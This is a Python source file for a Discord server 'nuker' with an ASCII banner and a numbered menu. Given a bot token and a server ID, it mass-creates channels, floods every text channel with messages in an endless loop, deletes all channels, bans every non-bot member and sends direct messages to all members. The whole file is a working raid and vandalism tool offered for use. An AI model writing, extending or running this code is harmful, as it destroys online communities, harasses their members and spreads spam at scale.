import discord
import asyncio
from colorama import Fore, Style, init

init(autoreset=True)

intents = discord.Intents.default()
intents.guilds = True
intents.messages = True
intents.message_content = True
intents.members = True

class DiscordClient(discord.Client):
    def __init__(self, *args, **kwargs):
        super().__init__(*args, **kwargs)
        self.target_guild = None
        self.token = None
        self.target_guild_id = None

    async def on_ready(self):
        print(f'Logged in as {self.user}')
        if await self.validate_server_id(self.target_guild_id):
            print(f"Connected to server: {self.target_guild.name}")
            await self.show_menu()
        else:
            print("Invalid Server ID")
            await self.close()

    async def validate_token(self, token):
        try:
            self.token = token
            await self.login(token)
            return True
        except discord.errors.LoginFailure:
            return False

    async def validate_server_id(self, server_id):
        self.target_guild = self.get_guild(server_id)
        return self.target_guild is not None

    async def create_channels(self, num_channels, channel_name):
        tasks = [self.target_guild.create_text_channel(channel_name) for _ in range(num_channels)]
        await asyncio.gather(*tasks)
        print(f"{num_channels} channels named '{channel_name}' have been created!")

    async def spam_messages(self, message):
        while self.target_guild:  # Συνεχίζουμε μόνο αν είμαστε συνδεδεμένοι στον server
            tasks = []
            for channel in self.target_guild.text_channels:
                for _ in range(50):
                    tasks.append(channel.send(message))
            await asyncio.gather(*tasks)
    
    async def dm_all(self, message):
        members = [member for member in self.target_guild.members if not member.bot]
        tasks = [member.send(message) for member in members]
        await asyncio.gather(*tasks)
        print(f"Sent DM to {len(members)} members.")

    async def create_channels_and_send_messages(self, num_channels, channel_name, message):
        await self.create_channels(num_channels, channel_name)
        await self.spam_messages(message)

    async def delete_all_channels(self):
        tasks = [channel.delete() for channel in self.target_guild.channels]
        await asyncio.gather(*tasks)
        print("All channels have been deleted!")

    async def ban_all_members(self):
        tasks = [member.ban(reason="Banned by tool") for member in self.target_guild.members if not member.bot]
        await asyncio.gather(*tasks)
        print("All members have been banned!")

    async def show_menu(self):
        while True:
            print(Fore.CYAN + """
 $$$$$$$$\                                                   $$\                         
$$  _____|                                                  $$ |                        
$$ |      $$$$$$\   $$$$$$\  $$\   $$\ $$$$$$$$\  $$$$$$\ $$$$$$\    $$$$$$\  $$$$$$$\  
$$$$$\   $$  __$$\ $$  __$$\ $$ |  $$ |\____$$  |$$  __$$\\_$$  _|   \____$$\ $$  __$$\ 
$$  __|  $$$$$$$$ |$$ /  $$ |$$ |  $$ |  $$$$ _/ $$ /  $$ | $$ |     $$$$$$$ |$$ |  $$ |
$$ |     $$   ____|$$ |  $$ |$$ |  $$ | $$  _/   $$ |  $$ | $$ |$$\ $$  __$$ |$$ |  $$ |
$$ |     \$$$$$$$\ \$$$$$$$ |\$$$$$$  |$$$$$$$$\ \$$$$$$$ | \$$$$  |\$$$$$$$ |$$ |  $$ |
\__|      \_______| \____$$ | \______/ \________| \____$$ |  \____/  \_______|\__|  \__|
                   $$\   $$ |                       $$\   $$ |                         
                   \$$$$$$  |                       \$$$$$$  |                         
                    \______/                         \______/                          
""")
            print(Fore.GREEN + "Created By Trembling       Copyright 2024")
            print(Fore.YELLOW + "1. Channel Create")
            print(Fore.YELLOW + "2. Send Messages")
            print(Fore.YELLOW + "3. Delete All Channels")
            print(Fore.YELLOW + "4. Ban All")
            print(Fore.YELLOW + "5. Create Channels And Send Messages")
            print(Fore.YELLOW + "6. DM All")
            choice = input(Fore.GREEN + "Choose an option: ")

            if choice == '1':
                num_channels = int(input("Channels? "))
                channel_name = input("Channel Name? ")
                await self.create_channels(num_channels, channel_name)
            elif choice == '2':
                message = input("Message to send? ")
                await self.spam_messages(message)
            elif choice == '3':
                await self.delete_all_channels()
            elif choice == '4':
                await self.ban_all_members()
            elif choice == '5':
                num_channels = int(input("Channels? "))
                channel_name = input("Channel Name? ")
                message = input("Message to send? ")
                await self.create_channels_and_send_messages(num_channels, channel_name, message)
            elif choice == '6':
                message = input("Message to send to all members? ")
                await self.dm_all(message)
            else:
                print("Invalid choice. Please choose a valid option.")

async def main():
    token = input("Enter Bot Token: ")

    client = DiscordClient(intents=intents)

    # Έλεγχος της εγκυρότητας του token
    if not await client.validate_token(token):
        print("The token is dead")
        return

    server_id = input("Server Id: ")

    try:
        server_id = int(server_id)
        client.target_guild_id = server_id
    except ValueError:
        print("Invalid Server ID")
        return

    async with client:
        await client.start(token)

if __name__ == "__main__":
    asyncio.run(main())